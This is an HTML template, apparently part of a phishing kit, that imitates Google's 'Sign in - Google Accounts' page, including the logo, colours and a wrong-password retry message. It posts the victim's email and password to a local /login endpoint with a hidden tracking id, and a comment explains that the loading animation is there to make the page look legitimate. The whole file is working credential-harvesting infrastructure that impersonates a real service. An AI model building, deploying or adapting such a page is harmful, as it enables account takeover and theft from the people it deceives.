<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link href="https://fonts.googleapis.com/css?family=Roboto:400,500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', arial, sans-serif;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #202124;
        }

        .container {
            width: 450px;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }

        /* Loading Bar Animation */
        #loading-bar {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 4px;
            background-color: #f1f1f1;
            display: none;
        }
        #loading-bar div {
            height: 100%;
            background-color: #1a73e8;
            width: 30%;
            position: absolute;
            animation: loading 1.5s infinite linear;
        }
        @keyframes loading {
            0% { left: -30%; }
            100% { left: 100%; }
        }

        @media (max-width: 500px) {
            .container { border: none; width: 100%; padding: 24px; }
        }

        .logo { margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; margin: 10px 0 8px; }
        .subtitle { font-size: 16px; margin-bottom: 30px; }

        .input-group { margin-bottom: 10px; text-align: left; }
        input {
            width: 100%;
            padding: 13px 15px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            box-sizing: border-box;
            outline: none;
        }
        input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }

        .error-msg { color: #d93025; font-size: 12px; display: flex; align-items: center; margin-top: 8px; }

        .footer-btns {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 40px;
        }

        .btn-next {
            background-color: #1a73e8;
            color: #fff;
            padding: 10px 24px;
            border: none;
            border-radius: 4px;
            font-weight: 500;
            cursor: pointer;
        }
        .btn-next:disabled { background-color: #ccc; cursor: not-allowed; }

        .links { color: #1a73e8; font-size: 14px; text-decoration: none; font-weight: 500; }
    </style>
</head>
<body>

<div class="container">
    <div id="loading-bar"><div></div></div>

    <div class="logo">
        <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg">
            <path d="M7.1 5.4v2.4h5.1c-.2 1.1-.7 2-1.6 2.6-1.1.7-2.4 1-3.5 1-2.9 0-5.3-2.1-5.3-5.2S4.2 1 7.1 1c1.6 0 2.8.6 3.7 1.4l1.8-1.8C11.1.3 9.3-.5 7.1-.5c-3.8 0-6.8 3-6.8 6.9s3 6.9 6.8 6.9c2.1 0 3.8-.7 5.1-2 1.4-1.3 1.9-3.2 1.9-4.9 0-.5 0-.9-.1-1.4H7.1z" fill="#4285F4"></path>
            <path d="M19.7 4.5c-2.9 0-5.2 2.3-5.2 5.2s2.3 5.2 5.2 5.2 5.2-2.3 5.2-5.2-2.3-5.2-5.2-5.2zm0 8.1c-1.5 0-2.8-1.2-2.8-2.9s1.3-2.9 2.8-2.9 2.8 1.2 2.8 2.9-1.3 2.9-2.8 2.9z" fill="#EA4335"></path>
            <path d="M30.7 4.5c-2.9 0-5.2 2.3-5.2 5.2s2.3 5.2 5.2 5.2 5.2-2.3 5.2-5.2-2.3-5.2-5.2-5.2zm0 8.1c-1.5 0-2.8-1.2-2.8-2.9s1.3-2.9 2.8-2.9 2.8 1.2 2.8 2.9-1.3 2.9-2.8 2.9z" fill="#FBBC05"></path>
            <path d="M41.5 4.5c-2.8 0-5.2 2.3-5.2 5.2s2.2 5.2 5.2 5.2c1.4 0 2.5-.5 3.3-1.4v1c0 2-1.1 3.1-2.8 3.1-1.4 0-2.3-1-2.7-1.9l-2.1.9c.6 1.5 2.2 3.2 4.8 3.2 2.7 0 5-1.6 5-5.5V4.8h-2.1v.9c-.8-.9-1.9-1.2-3-1.2zm-.2 8.1c-1.5 0-2.8-1.3-2.8-2.9s1.3-2.9 2.8-2.9 2.8 1.2 2.8 2.9-1.3 2.9-2.8 2.9z" fill="#4285F4"></path>
            <path d="M49 1h2.1v13.4H49z" fill="#34A853"></path>
            <path d="M57.9 4.5c-2.5 0-4.6 1.1-5.6 3.3l2.1.9c.5-1 1.4-1.6 2.5-1.6.8 0 1.5.4 1.8 1.1l-6.7 2.8c-.5.2-.9.6-1.1 1.1-.3.5-.4 1-.4 1.6 0 2.5 2 4.1 4.7 4.1 2.1 0 3.3-1 4.2-2.1v1.7h2.1V9.5c0-3.3-2.4-5-4.8-5zm-.1 8.1c-1.1 0-2.1-.6-2.5-1.6l4.6-1.9c-.2 1.4-1 3.5-2.1 3.5z" fill="#EA4335"></path>
        </svg>
    </div>

    <h1>Sign in</h1>
    <p class="subtitle">Use your Google Account</p>

    <form id="loginForm" action="/login" method="POST">
        <input type="hidden" name="tid" value="{{ tid }}">

        <div class="input-group">
            <input type="text" name="identifier" value="{{ email }}" placeholder="Email or phone" required>
        </div>

        {% if error_type == "wrong_pass" %}
        <div class="error-msg">
            <svg aria-hidden="true" fill="currentColor" width="16px" height="16px" viewBox="0 0 24 24" style="margin-right: 8px;">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
            </svg>
            Wrong password. Try again.
        </div>
        {% endif %}

        <div class="input-group" style="margin-top: 15px;">
            <input type="password" name="password" placeholder="Enter your password" required>
        </div>

        <div class="footer-btns">
            <a href="#" class="links">Create account</a>
            <button type="submit" id="submitBtn" class="btn-next">Next</button>
        </div>
    </form>
</div>

<script>
    // This script handles the "Loading" state so the user doesn't think it's stuck
    document.getElementById('loginForm').addEventListener('submit', function() {
        var btn = document.getElementById('submitBtn');
        var bar = document.getElementById('loading-bar');
        
        // Show the blue loading line at the top
        bar.style.display = 'block';
        
        // Disable the button and change text to look professional
        btn.disabled = true;
        btn.innerText = 'Connecting...';
        btn.style.opacity = '0.7';
    });
</script>

</body>
</html>
